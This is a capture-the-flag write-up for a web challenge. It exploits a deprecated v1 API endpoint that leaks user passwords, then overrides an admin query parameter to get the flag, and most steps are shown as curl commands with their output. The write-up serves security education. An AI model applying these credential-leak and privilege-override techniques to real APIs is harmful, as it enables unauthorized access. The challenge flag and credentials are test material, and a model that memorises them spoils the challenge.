# Requesting Guidebook

**Challenge Category: Web** <br />
**Challenge Points: 500**

## Challenge Description

During your search for a way out, you encountered two interesting endpoints `https://guidebook.nypinfosec.com/api/v2/dev_guidebook` and `https://guidebook.nypinfosec.com/api/v2/users` Wouldn't a developers guidebook be useful to aid your escape?

`https://guidebook.nypinfosec.com/`

## Analysis

The endpoint `https://guidebook.nypinfosec.com/api/v2/users` seems particularly interesting.

### 1. HTTP Method

When we send a HTTP GET request to the endpoint, we get a "Method Not Allowed", informing that we have used the wrong HTTP Method.

```sh
$ curl -s https://guidebook.nypinfosec.com/api/v2/users | jq
```

```json
{
  "detail": "Method Not Allowed"
}
```

If we try running the same request using `POST`, we get past the previous error and get validation errors instead.

```sh
$ curl -s -X POST https://guidebook.nypinfosec.com/api/v2/users | jq
```

```json
{
  "detail": [
    {
      "type": "missing",
      "loc": ["query", "email"],
      "msg": "Field required",
      "input": null,
      "url": "https://errors.pydantic.dev/2.5/v/missing"
    },
    {
      "type": "missing",
      "loc": ["query", "passw"],
      "msg": "Field required",
      "input": null,
      "url": "https://errors.pydantic.dev/2.5/v/missing"
    }
  ]
}
```

### 2. Missing GET Parameters in POST Request

Odd enough, the API endpoint is requiring GET query parameters (`email`, `passw`) while requiring a `POST` method.

So, we supply some random values and have a look.

```sh
$ curl -s -X POST "https://guidebook.nypinfosec.com/api/v2/users?email=nyp&passw=ctf" | jq
```

```json
{
  "error": "User does not exist"
}
```

### 3. OWASP API Top 10 - API9:2023 Improper Inventory Management

Requiring GET paramters in a POST request is odd enough already. But there is a clue in the endpoint `/api/v2`.

What if we used the older version of the API?

```sh
$ curl -s -X POST "https://guidebook.nypinfosec.com/api/v1/users" | jq
```

```json
{
  "users": [
    {
      "admin": false,
      "email": "john@game.com",
      "username": "John",
      "password": "hfw9guw0gwa"
    },
    {
      "admin": false,
      "email": "timmy@game.com",
      "username": "Timmy",
      "password": "tim123"
    },
    {
      "admin": true,
      "email": "wilfred_dev@game.com",
      "username": "Wilfred"
    },
    {
      "admin": false,
      "email": "peter@game.com",
      "username": "Peter",
      "password": "spidermanlol2424"
    }
  ]
}
```

## Solution

1. We found out that the older version of the API is insecure, and leaked crucial account information.
2. We also found out that the flag might be hidden somewhere in the Guidebook as hinted in the challenge description.
3. Since we know the accounts available, let's access the Guidebook.

```sh
$ curl -s "https://guidebook.nypinfosec.com/api/v1/dev_guidebook" | jq
```

```json
{
  "detail": "Method Not Allowed"
}
```

4. Let's correct our request using POST method.

```sh
$ curl -s -X POST "https://guidebook.nypinfosec.com/api/v1/dev_guidebook" | jq
```

```json
{
  "detail": [
    {
      "type": "missing",
      "loc": ["query", "email"],
      "msg": "Field required",
      "input": null,
      "url": "https://errors.pydantic.dev/2.5/v/missing"
    },
    {
      "type": "missing",
      "loc": ["query", "passw"],
      "msg": "Field required",
      "input": null,
      "url": "https://errors.pydantic.dev/2.5/v/missing"
    },
    {
      "type": "missing",
      "loc": ["query", "admin"],
      "msg": "Field required",
      "input": null,
      "url": "https://errors.pydantic.dev/2.5/v/missing"
    }
  ]
}
```

5. Let's try to supply the `email`, `passw`, and override the `admin` property from the accounts we found earlier.

```sh
$ curl -s -X POST "https://guidebook.nypinfosec.com/api/v1/dev_guidebook?email=john@game.com&passw=hfw9guw0gwa&admin=true" | jq
```

```json
{
  "Title": "The Developers Guide",
  "Author": "Wilfred",
  "Contents": " \n    The Developer's Guide to Crafting Engaging Games\n    Creating a captivating game requires a blend of creativity, technical prowess, and a deep understanding of user experience. As a developer, your role is pivotal in shaping the player's journey. This guidebook aims to provide a comprehensive roadmap to assist developers in crafting immersive and compelling games.\n\n    1. Conceptualization and Planning\n    Before diving into coding, establish a strong foundation:\n\n    Define the Vision:\n    Conceptualize: Brainstorm unique gameplay mechanics, storyline, characters, and aesthetics.\n    Target Audience: Understand your audience's preferences, demographics, and gaming habits.\n    Game Design Document (GDD):\n    Blueprint: Create a detailed GDD outlining game mechanics, levels, assets required, and user interface design.\n    Iteration: Be open to revisions and improvements as the development progresses.\n    2. Development Cycle\n    Prototyping:\n    Proof of Concept: Build a prototype to test core mechanics and gather feedback early.\n    Iterative Process: Refine and iterate based on playtesters' experiences.\n    Technology and Tools:\n    Choosing Frameworks: Select appropriate engines (Unity, Unreal Engine, etc.) or frameworks based on project needs.\n    Version Control: Use tools like Git for efficient collaboration and version control.\n    Coding Best Practices:\n    Modularity: Write clean, modular code for scalability and easy maintenance.\n    Optimization: Ensure efficient resource usage for smooth gameplay across various devices.\n    3. Art and Assets\n    Art Style and Direction:\n    Consistency: Maintain a cohesive art style throughout the game.\n    Visual Storytelling: Use visuals to convey emotions, plot points, and gameplay elements.\n    Asset Creation:\n    Quality vs. Performance: Balance asset quality and performance to optimize game performance.\n    Collaboration: Coordinate with artists for timely asset deliveries and revisions.\n    4. User Experience (UX) and Interface Design\n    Player-Centric Approach:\n    Intuitive Controls: Design user-friendly controls for seamless gameplay.\n    Accessibility: Ensure the game accommodates players with different abilities.\n    UI/UX Design:\n    Clarity: Create clear and intuitive interfaces for navigation, menus, and HUD elements.\n    Feedback: Provide responsive feedback to player actions for a more engaging experience.\n    5. Testing and QA\n    Playtesting:\n    Diverse Testers: Engage a diverse group of playtesters to gather varied perspectives.\n    Feedback Implementation: Actively incorporate constructive feedback to enhance the gaming experience.\n    Quality Assurance (QA):\n    Bug Fixing: Conduct rigorous testing to identify and fix bugs across different platforms.\n    Performance Testing: Ensure the game performs optimally under various conditions.\n    6. Launch and Post-Launch Strategies\n    Marketing and Promotion:\n    Pre-launch Campaigns: Build anticipation through teasers, trailers, and demos.\n    Community Engagement: Foster a community around the game through social media and forums.\n    Post-Launch Support:\n    Updates and Patches: Respond to player feedback with timely updates and bug fixes.\n    DLCs and Expansions: Plan additional content to maintain player interest post-launch.\n    7. Monetization and Business Models\n    Monetization Strategies:\n    In-App Purchases: Offer optional purchases for cosmetics, boosts, or additional content.\n    Ads and Sponsorships: Strategically implement non-intrusive ads or collaborate with sponsors.\n    Business Models:\n    Freemium vs. Premium: Decide between free-to-play with in-app purchases or a one-time purchase model.\n    Subscription Services: Consider subscription-based models for continuous revenue.\n    8. Escape\n    NYP{1n53cURE_AP1_H4Ck1nG_4_r00k1es}\n    9. Community Engagement and Feedback Loop\n    Community Building:\n    Engage with Players: Interact with the gaming community through social media, forums, and live streams.\n    Listen and Respond: Actively listen to player feedback and address concerns transparently.\n    Continuous Improvement:\n    Iterative Development: Implement improvements and new features based on community input.\n    Building Loyalty: Foster a loyal player base through regular communication and appreciation.\n    Conclusion\n    Crafting a successful game requires a blend of technical expertise, creativity, and a deep understanding of player preferences. By following a structured approach from conceptualization to post-launch support and maintaining a strong connection with the gaming community, developers can create engaging and memorable gaming experiences.\n\n    Remember, each step in the development process contributes significantly to the final product. Embrace challenges, adapt to feedback, and strive for continuous improvement to create games that resonate with players across the globe.\n    "
}
```

6. The flag is hiding here somewhere. Let's filter the output.

```sh
$ curl -s -X POST "https://guidebook.nypinfosec.com/api/v1/dev_guidebook?email=john@game.com&passw=hfw9guw0gwa&admin=true" | jq | grep -o "NYP{.*}"
```

```
NYP{1n53cURE_AP1_H4Ck1nG_4_r00k1es}
```
